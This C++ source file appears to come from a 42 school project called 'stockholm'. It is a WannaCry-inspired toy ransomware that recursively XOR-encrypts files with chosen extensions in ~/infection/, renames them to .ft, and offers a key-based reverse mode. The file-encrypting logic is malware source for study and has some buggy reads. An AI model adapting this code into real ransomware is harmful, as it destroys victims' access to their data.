/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   Stockholm.class.cpp                                :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: bguyot <bguyot@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/05/19 09:51:57 by bguyot            #+#    #+#             */
/*   Updated: 2023/05/19 15:55:33 by bguyot           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../incs/Stockholm.class.hpp"

Stockholm::Stockholm(void): _path(std::filesystem::path{getenv("HOME") + std::string("/infection/")})
{
	this->_help = false;
	this->_version = false;
	this->_silent = false;
	this->_reverse = false;
}

Stockholm::~Stockholm(void)
{}

void	Stockholm::setHelp(bool help)
{
	this->_help = help;
}

void	Stockholm::setVersion(bool version)
{
	this->_version = version;
}

void	Stockholm::setSilent(bool silent)
{
	this->_silent = silent;
}

void	Stockholm::setReverse(bool reverse)
{
	this->_reverse = reverse;
}

void	Stockholm::setKey(std::string key)
{
	this->_key = key;
}

void	Stockholm::run(void)
{
	std::cout << this->_help << std::endl;
	std::cout << this->_version << std::endl;
	std::cout << this->_silent << std::endl;
	std::cout << this->_reverse << std::endl;
	if (this->_help)
		this->_printHelp();
	else if (this->_version)
		this->_printVersion();
	else if (this->_reverse)
		this->_decipher(this->_path);
	else
		this->_cipher(this->_path);
}

void	Stockholm::_printHelp(void)
{
	std::cout << "Usage:" << std::endl;
	std::cout << "\t./stockholm [-hv]" << std::endl;
	std::cout << "\t./stockholm [-s] [-r] [-r key]" << std::endl;
	std::cout << std::endl;
	std::cout << "Description:" << std::endl;
	std::cout << "\tstockholm is a 42 project that mimic the encyption of files, inspired by Wannacry but limited to the \"~/infection/\" folder. This project is for educational purposes only. You should never use the type of program for malicious purposes." << std::endl;
	std::cout << std::endl;
	std::cout << "Options:" << std::endl;
	std::cout << "\t-h\t\tPrint this help message and exit" << std::endl;
	std::cout << "\t-v\t\tPrint the version and exit" << std::endl;
	std::cout << "\t-s\t\tSilent mode" << std::endl;
	std::cout << "\t-r\t\tReverse mode, use the key to decrypt the files" << std::endl;
	std::cout << std::endl;
}

void	Stockholm::_printVersion(void)
{
	std::cout << "stockholm v" << VERSION << std::endl;
}

void	Stockholm::_decipher(std::filesystem::path path)
{
	if (!std::filesystem::exists(path) || !std::filesystem::is_directory(path))
	{
		std::cout << "Error while decyphering: path " << path << " does not exist" << std::endl;
		return ;
	}
	for (const auto & entry : std::filesystem::directory_iterator(path))
	{
		if (std::filesystem::is_directory(entry.path()))
			this->_decipher(entry.path());
		else
			this->_decipherFile(entry.path());
	}
}

void	Stockholm::_decipherFile(std::filesystem::path path)
{
	//check if the file path extension is in the _extensions vector
	if (path.extension() != ".ft")
		return ;
		
	
	//cipher the file
	try {
		int fd_in = open(path.c_str(), O_RDONLY);
		int fd_out = open(path.c_str(), O_WRONLY);
		if (fd_in == -1 || fd_out == -1)
		{
			// std::cout << "Error while opening file " << path << std::endl;
			return ;
		}
		char buffer;
		buffer = 0;
		int ret = 0;
		int i = 0;
		std::string file_data = "";
		while ((ret = read(fd_in, &buffer, 1)) > 0)
		{
			buffer ^= this->_key[i % this->_key.length()];
			write(fd_out, &buffer, 1);
			i++;
		}
		if (ret == -1)
		{
			// std::cout << "Error while reading file " << path << std::endl;
			return ;
		}
		close(fd_in);
		close(fd_out);
		//remove the .ft extension to the file
		std::filesystem::path new_path = path;
		std::filesystem::rename(path, new_path.replace_extension(""));

		if (!this->_silent)
			std::cout << "Deciphering file " << path << std::endl;
	} catch(...) {
		return ;
	}
}


void	Stockholm::_cipher(std::filesystem::path path)
{
	if (!std::filesystem::exists(path) || !std::filesystem::is_directory(path))
	{
		std::cout << "Error while cyphering: path " << path << " does not exist" << std::endl;
		return ;
	}
	for (const auto & entry : std::filesystem::directory_iterator(path))
	{
		if (std::filesystem::is_directory(entry.path()))
			this->_cipher(entry.path());
		else
			this->_cipherFile(entry.path());
	}
}

void	Stockholm::_cipherFile(std::filesystem::path path)
{
	//check if the file path extension is in the _extensions vector
	if (std::find(this->_extensions.begin(), this->_extensions.end(), path.extension()) == this->_extensions.end())
		return ;
		
	
	//cipher the file
	try {
		int fd = open(path.c_str(), O_RDWR);
		if (fd == -1)
		{
			// std::cout << "Error while opening file " << path << std::endl;
			return ;
		}
		char *buffer = new char[1];
		int ret = 0;
		std::string file_data = "";
		while ((ret = read(fd, buffer, 1)) > 0)
		{
			file_data += buffer;
		}
		if (ret == -1)
		{
			// std::cout << "Error while reading file " << path << std::endl;
			return ;
		}
		for (unsigned int i = 0; i < file_data.length(); i++)
		{
			file_data[i] ^= this->_key[i % this->_key.length()];
		}
		lseek(fd, 0, SEEK_SET);
		write(fd, file_data.c_str(), file_data.length());	
		close(fd);
		//add the .ft extension to the file
		std::filesystem::path newPath = path;
		std::filesystem::rename(path, newPath += ".ft");
		if (!this->_silent)
			std::cout << "Ciphering file " << path << std::endl;
	} catch(...) {
		return ;
	}
}